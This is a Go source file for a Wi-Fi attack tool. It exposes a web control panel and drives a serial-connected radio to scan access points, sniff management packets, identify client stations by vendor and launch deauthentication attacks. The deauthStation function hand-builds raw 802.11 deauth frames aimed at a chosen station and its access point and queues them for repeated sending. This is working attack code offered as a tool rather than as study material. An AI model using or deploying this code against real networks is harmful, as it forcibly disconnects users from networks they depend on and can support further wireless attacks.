package main

import (
	"flag"
	"html/template"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"reflect"
	"syscall"

	"github.com/tarm/serial"

	//"go.bug.st/serial.v1"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"time"

	"github.com/gobuffalo/packr"
	"github.com/gorilla/mux"
	"github.com/klauspost/oui"
)

const BAUD int = 115200 //Read from a file
const PORT string = "/dev/ttyAMA0"
const MSG_START byte = 0x02
const MSG_END byte = 0x03
const CONFIG_PATH string = "./src/static/configs/config.json"

type Settings struct {
	AccessPointCfg struct {
		Ssid    string `json:"ssid"`
		Passwd  string `json:"passwd"`
		Channel int    `json:"channel"`
		Hidden  bool   `json:"hidden"`
	} `json:"accesspoint"`
	ApScanner struct {
		Interval int  `json:"interval"`
		Deep     bool `json:"deep"`
		Async    bool `json:"async"`
		Channel  int  `json:"channel"`
		Hop      bool `json:"hop"`
	} `json:"apScanner"`
	PacketScanner struct {
		Interval int  `json:"interval"`
		Channel  int  `json:"channel"`
		Hop      bool `json:"hop"`
	} `json:"packetScanner"`
	Deauther struct {
		Interval int `json:"interval"`
		Channel  int `json:"channel"`
	} `json:"deauther"`
}

type AccessPoint struct {
	Ssid     string    `json:"ssid"`
	Enc      int       `json:"enc"`
	Rssi     int       `json:"rssi"`
	Bssid    string    `json:"bssid"`
	Channel  int       `json:"channel"`
	Hidden   bool      `json:"hidden"`
	Stations []Station `json:"stations"`
}

type Packet struct {
	Rssi    int    `json:"rssi"`
	Channel int    `json:"channel"`
	PktType string `json:"pkt_type"`
	Src     string `json:"src"`
	Dst     string `json:"dst"`
	Bssid   string `json:"bssid"`
	Ssid    string `json:"ssid"`
	Vendor  string `json:"vendor"`
}

type Station struct {
	Name   string `json:"name"`
	Vendor string `json:"vendor"`
	Mac    []byte `json:"mac"`
	FmtMac string `json:"fmtMac"`
	AP     []byte `json:"ap"`
}

var (
	AvailableAccesspoints map[string]AccessPoint
	router                *mux.Router
	writeQueue            [][]byte
	readQueue             []string
	debug                 = flag.Bool("debug", false, "Run in debug")
	packets               []Packet
	logs                  []string
	sConn                 *serial.Port
	settings              *Settings
	db                    oui.StaticDB
	packetCount           uint
)

func main() {
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	flag.Parse()
	settings = &Settings{}

	router = mux.NewRouter()

	var err error
	db, err = oui.OpenStaticFile("./src/static/configs/oui.txt")

	if err != nil {
		log.Println(err.Error())
		log_message(err.Error())
	}

	AvailableAccesspoints = make(map[string]AccessPoint)

	readConfig()
	initRoutes()

	if initSerial() && *debug == false {
		go ActionHandler()
	} else {
		go initMockData()
		go DataHandler()
	}

	http.ListenAndServe(":3000", router)
}

func initSerial() bool {
	log.Println("Opening serial connection...")
	log_message("Opening serial connection...")

	/*ports, err := serial.GetPortsList()

	if err != nil {
		log_message(err.Error())
		return false
	}

	if len(ports) == 0 {
		log_message("No serial ports were found...")
		return false
	}*/
	var err error

	mode := &serial.Config{Name: PORT, Baud: BAUD, ReadTimeout: time.Millisecond * 200}
	sConn, err = serial.OpenPort(mode)

	if err != nil {
		log.Println(err.Error())
		log_message(err.Error())

		return false
	}

	log.Println("Serial connection opened...")
	log_message("Serial connection opened...")

	return true
}

var mockSSID map[string]string = map[string]string{
	"SSID 1": "00:50:BA:F0:2D:A8",
	"SSID 2": "00:50:BA:97:F2:62",
	"SSID 3": "00:50:BA:1B:B4:81",
	"SSID 4": "00:50:BA:ED:6C:B1",
	"SSID 5": "00:50:BA:73:95:59",
}

var mockPacketMac []string = []string{
	"00:9A:CD:16:AF:EB",
	"38:F2:3E:D1:EB:3B",
	"3C:5A:B4:2C:62:5F",
	"3C:5A:B4:57:AE:FD",
	"00:18:71:F2:25:43",
	"00:15:F2:41:EF:A5",
	"00:23:54:1A:30:F2",
	"2C:9E:FC:74:A0:36",
	"D4:53:AF:FB:EB:14",
	"1C:E1:92:EE:5C:30",
}

func initMockData() {
	for true {
		readQueue = append(readQueue, generateData())
		time.Sleep(1000 * time.Millisecond)
	}
}

func MapRandomKeyGet(mapI interface{}) interface{} {
	keys := reflect.ValueOf(mapI).MapKeys()

	return keys[rand.Intn(len(keys))].Interface()
}

func generateData() string {
	rssi := rand.Intn(100)
	ch := rand.Intn(10) + 1

	var data string

	if rssi%2 == 0 {
		log_message("DEBUG: Generated Accesspoint")

		ms := MapRandomKeyGet(mockSSID).(string)
		mb := mockSSID[ms]

		data = fmt.Sprintf(`{"data_type": "accesspoint", "ssid": "%s", "enc": 2, "rssi": %d, "bssid":"%s", "channel": %d, "hidden": false}`, ms, rssi, mb, ch)

	} else {
		log_message("DEBUG: Generated Packet")

		mac := mockPacketMac[rand.Intn(9)]

		ms := MapRandomKeyGet(mockSSID).(string)
		mb := mockSSID[ms]

		data = fmt.Sprintf(`{"data_type": "packet", "pkt_type": "MGMT", "rssi": %d, "channel": %d, "src": "%s", "dst": "%s", "bssid": "%s", "ssid": "%s"}`, rssi, ch, mac, mb, mb, ms)
	}

	//fmt.Println(data)

	return data
}

func initRoutes() {
	resources := packr.NewBox("./src/static")
	templates := packr.NewBox("./src/views")

	log.Println("Initiating routes...")
	log_message("Initiating routes...")

	router.PathPrefix("/static").Handler(http.StripPrefix("/static/", http.FileServer(resources)))
	router.PathPrefix("/templates").Handler(http.StripPrefix("/templates/", http.FileServer(templates)))

	router.HandleFunc("/accesspoints", getAccessPoints).Methods("GET")
	router.HandleFunc("/getPackets", getPackets).Methods("GET")
	router.HandleFunc("/sniffPackets", sniffPackets).Methods("GET")
	router.HandleFunc("/getConfig", getConfig).Methods("GET")
	router.HandleFunc("/setConfig", setConfig).Methods("POST")
	router.HandleFunc("/getLogs", getLogs).Methods("GET")
	router.HandleFunc("/getPacketCount", getPacketCount).Methods("GET")
	router.HandleFunc("/deauth", deauthAttack).Methods("POST")

	//PAGES
	router.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		tmpl := []string{"/templates/index.html"}

		dir, err := os.Getwd()
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(dir)

		i, err := template.New("").ParseFiles(tmpl...)

		if err != nil {
			log.Println(err.Error())
			log_message(err.Error())

			return
		}

		log.Println("Redirecting to Home...")
		log_message("Redirecting to Home...")

		i.ExecuteTemplate(w, "indexHTML", "")
	})
}

func getAccessPoints(w http.ResponseWriter, r *http.Request) {
	log.Println(settings)

	var cmd string = fmt.Sprintf("scan -async=%t -hidden=%t -channel=%d -hop=%t", settings.ApScanner.Async, settings.ApScanner.Deep, settings.ApScanner.Channel, settings.ApScanner.Hop)
	log.Println(cmd)
	log_message(cmd)

	//TODO Uncomment me for prod
	writeQueue = append(writeQueue, []byte(cmd))

	re, _ := json.Marshal(AvailableAccesspoints)

	w.Header().Set("Content-Type", "application/json")
	w.Write(re)
}

func getPacketCount(w http.ResponseWriter, r *http.Request) {

	re, _ := json.Marshal(packetCount)

	packetCount = 0

	w.Header().Set("Content-Type", "application/json")
	w.Write(re)
}

func DataHandler() {
	for {
		if len(readQueue) == 0 {
			time.Sleep(200)
			continue
		}

		var buffer []byte = []byte(readQueue[0])
		readQueue = readQueue[1:]

		bufferMap := make(map[string]interface{})
		err := json.Unmarshal(buffer, &bufferMap)

		if err != nil {
			log.Println(err.Error())
			log_message(err.Error())

			continue
		}

		var datType string = fmt.Sprintf("%v", bufferMap["data_type"])

		switch datType {
		case "packet":
			packet := Packet{}

			if err = json.Unmarshal(buffer, &packet); err != nil {
				log.Println(err.Error())
				log_message(err.Error())

				break
			}

			var mac net.HardwareAddr

			if packet.Src != packet.Bssid {
				mac, err = net.ParseMAC(packet.Src)
			} else if packet.Dst != packet.Bssid {
				mac, err = net.ParseMAC(packet.Src)
			}

			if db != nil {
				macb := []byte(mac)

				if len(macb) == 6 {
					entry, err := db.Query(fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X", macb[0], macb[1], macb[2], macb[3], macb[4], macb[5]))

					if err != nil {
						log.Println(err.Error())
						log_message(err.Error())

						packets = append(packets, packet)
						packetCount++

						continue
					}

					packet.Vendor = entry.Manufacturer
				}
			}

			packets = append(packets, packet)
			packetCount++

			if packet.PktType != "MGMT" {
				break
			}

			station := Station{}

			if mac != nil {
				station.Mac = []byte(mac)
				station.FmtMac = fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5])
			}

			if err != nil {
				log.Println(err.Error())
				log_message(err.Error())

				break
			}

			if _, ok := AvailableAccesspoints[packet.Bssid]; ok {
				apMac, err := net.ParseMAC(packet.Bssid)
				station.AP = []byte(apMac)

				station.Vendor = packet.Vendor

				if err != nil {
					log.Println(err.Error())
					log_message(err.Error())

					break
				}

				Ap := AvailableAccesspoints[packet.Bssid]

				var dup bool = false

				for _, sta := range Ap.Stations {
					if station.FmtMac == sta.FmtMac {
						dup = true
					}
				}

				if dup == true {
					log_message("Breaking")
					break
				}

				log_message("Adding Station")

				Ap.Stations = append(Ap.Stations, station)
				AvailableAccesspoints[packet.Bssid] = Ap
			}

			break
		case "accesspoint":
			ap := AccessPoint{}
			ap.Stations = []Station{}

			if err = json.Unmarshal(buffer, &ap); err != nil {
				log.Println(err.Error())
				log_message(err.Error())

				break
			}

			if val, ok := AvailableAccesspoints[ap.Bssid]; ok {
				ap.Stations = val.Stations
			}

			AvailableAccesspoints[ap.Bssid] = ap

			break
		default:
			break
		}
	}
}

func RemoveIndex(s []int, index int) []int {
	return append(s[:index], s[index+1:]...)
}

func getPackets(w http.ResponseWriter, r *http.Request) {
	re, _ := json.Marshal(packets)

	w.Header().Set("Content-Type", "application/json")
	w.Write(re)
}

func sniffPackets(w http.ResponseWriter, r *http.Request) {
	var cmd string = fmt.Sprintf("sniff -interval=%d -channel=%d -hop=%t", settings.PacketScanner.Interval, settings.PacketScanner.Channel, settings.PacketScanner.Hop)

	log.Println(cmd)
	log_message(cmd)

	//TODO Uncomment me for prod
	writeQueue = append(writeQueue, []byte(cmd))

	log.Println("Sniffing packets...")
	log_message("Sniffing packets...")

	w.Header().Set("Content-Type", "application/json")
}

func startAccessPoint() {
	var cmd string = fmt.Sprintf("setup  -ssid=%q -hidden=%t -channel=%d -password=%q", settings.AccessPointCfg.Ssid, settings.AccessPointCfg.Hidden, settings.AccessPointCfg.Channel, settings.AccessPointCfg.Passwd)

	log.Println(cmd)
	log_message(cmd)

	writeQueue = append(writeQueue, []byte(cmd))

	log.Println("Starting accesspoint packets...")
	log_message("Starting accesspoint packets...")
}

func getConfig(w http.ResponseWriter, r *http.Request) {
	if _, err := os.Stat(CONFIG_PATH); os.IsNotExist(err) {
		log.Println("Config file does not exist...")
		log_message("Config file does not exist...")

		createConfig(`{"accesspoint":{"ssid":"Lambs to the Cosmic Slaughter","passwd":"Rick and Mortison","channel":12,"hidden":false},"apScanner":{"interval":1000,"deep":true,"async":false,"channel":12,"hop":false},"packetScanner":{"interval":1000, "channel": 12, "hop": false}}`)
	}

	var dat []byte = readConfig()

	log.Println("Getting Config...")
	log_message("Getting Config...")

	w.Header().Set("Content-Type", "application/json")
	w.Write(dat)
}

func setConfig(w http.ResponseWriter, r *http.Request) {
	body, _ := ioutil.ReadAll(r.Body)

	_, err := os.Stat(CONFIG_PATH)

	if err == nil {
		err := os.Remove(CONFIG_PATH)

		if err != nil {
			log.Println("Error removing file...")
			log_message("Error removing file...")
		}
	}

	createConfig(string(body))

	json.Unmarshal(body, &settings)
	startAccessPoint()
}

func readConfig() []byte {
	file, err := os.Open(CONFIG_PATH)

	log.Println("Reading file...")
	log_message("Reading file...")

	if err != nil {
		log.Println(err.Error())
		log_message(err.Error())

		return []byte{}
	}

	dat, err := ioutil.ReadAll(file)

	if err != nil {
		log.Println(err.Error())
		log_message(err.Error())

		return []byte{}
	}

	log.Println("File read...")
	log_message("File read...")

	json.Unmarshal(dat, settings)

	return dat
}

//func flash(w http.ResponseWriter, r *http.Request) {
//var cmd String = ""
//}

func createConfig(data string) {
	file, err := os.Create("./src/static/configs/config.json")

	if err != nil {
		log.Println("Error creating new config file...")
		log_message("Error creating new config file...")

		return
	}

	_, err = file.Write([]byte(data))

	if err != nil {
		log.Println("Error writing to new config file...")
		log_message("Error writing to new config file...")

		return
	}

	log.Println("New config file connected...")
	log_message("New config file connected...")
}

func deauthAttack(w http.ResponseWriter, r *http.Request) {
	body, _ := ioutil.ReadAll(r.Body)
	stations := []Station{}
	json.Unmarshal(body, &stations)

	if stations == nil {
		return
	}

	log.Println("Deauthing stations...")
	log_message("Deauthing stations...")

	//Loop through each station and create the corrosponding deauth packet
	for _, sta := range stations {
		deauthStation(sta)
	}
}

/*
*	Pass a station and a deauth packet will be created to be sent to the station aswell as the
*	accesspoint. The created packet will be pushed to the writeQueue to be sent
 */

func deauthStation(station Station) {
	var pa [][]byte = [][]byte{
		{0xC0, 0x00},   // Type, Subtype
		{0x00, 0x00},   // Duration
		station.Mac[:], // Receiver
		station.AP[:],  // Source
		station.AP[:],  // BSSID
		{0x00, 0x00},   // Fragment and Sequence
		{0x01, 0x00},   // Reason
	}

	var ps [][]byte = [][]byte{
		{0xC0, 0x00},
		{0x00, 0x00},
		station.AP[:],
		station.Mac[:],
		station.Mac[:],
		{0x00, 0x00},
		{0x01, 0x00},
	}

	//settingsDat := readConfig()
	//json.Unmarshal(settingsDat, &settings)

	cmd := fmt.Sprintf("send -interval=%d -channel=%d -buffer=%x", settings.Deauther.Interval, settings.Deauther.Channel, createPacket(pa))
	log.Println(cmd)
	log_message(cmd)

	writeQueue = append(writeQueue, []byte(cmd))

	cmd = fmt.Sprintf("send -interval=%d -channel=%d -buffer=%x", settings.Deauther.Interval, settings.Deauther.Channel, createPacket(ps))
	log.Println(cmd)
	log_message(cmd)

	writeQueue = append(writeQueue, []byte(cmd))
}

/*
*	Pass the function a list of parts
*	it will loop through and stitch the
*	parts together and return the result
 */
func createPacket(parts [][]byte) []byte {
	var packet []byte

	for _, part := range parts {
		packet = append(packet, part...)
	}

	return packet
}

func WriteHandler() {
	for true {
		if len(writeQueue) > 0 {
			data := writeQueue[0]

			if len(writeQueue) > 1 {
				writeQueue = writeQueue[1:]
			}

			if data == nil {
				return
			}

			data = append(data, 0x0A)

			log.Println(fmt.Sprintf("Command => %s", data))

			_, err := sConn.Write(data)

			if err != nil {
				log.Println(err.Error())
				log_message(err.Error())
			}
		}
	}
}

func ReadHandler() {
	for true {
		var building bool = false
		var buf []byte
		var ch []byte = make([]byte, 1)

		_, err := sConn.Read(ch)

		if err != nil {
			log.Println(err.Error())
			log_message(err.Error())

			continue
		}

		for ch[0] != MSG_END {
			_, err = sConn.Read(ch)

			if err != nil {
				log.Println(err.Error())
				log_message(err.Error())

				continue
			}

			if ch[0] == MSG_START {
				building = true
			} else if ch[0] == MSG_END {
				break
			} else if building {
				buf = append(buf, ch[0])
			}
		}

		if buf != nil {
			readQueue = append(readQueue, string(buf))
		}
	}
}

func CloseSerial() {
	sigs := make(chan os.Signal, 2)

	signal.Notify(sigs, os.Interrupt, syscall.SIGTERM)

	go func() {
		<-sigs
		sConn.Close()
		os.Exit(0)
	}()
}

func ActionHandler() {
	CloseSerial()
	go ReadHandler()
	go WriteHandler()
	go DataHandler()
}

/*for true {
		if len(writeQueue) > 0 {
			data := writeQueue[0]

			if (len(writeQueue) > 1) {
				writeQueue = writeQueue[1:]
			}

			WriteHandler(data);
		} else {
			byteRead := ReadHandler();

			if byteRead != nil {
				readQueue = append(readQueue, string(byteRead))
			}
		}
	}
}*/

func ft(t time.Time) string {
	hour := t.Hour()
	min := t.Minute()
	sec := t.Second()

	output := fmt.Sprintf("%02d:%02d:%02d",
		hour,
		min,
		sec)

	return output
}

func log_message(message string) {

	if len(logs) > 1500 {
		logs = logs[1:]
	}

	logs = append(logs, ("[" + ft(time.Now()) + "] " + message))
}

func getLogs(w http.ResponseWriter, r *http.Request) {
	re, _ := json.Marshal(logs)

	w.Header().Set("Content-Type", "application/json")
	w.Write(re)
}

/*
	Single deauth
		Replace target with station address
		Replace source and bssid with access point addres
	Broadcast deauth
		Replace target with accesspoint address
		Replace source and bssid with station address
*/
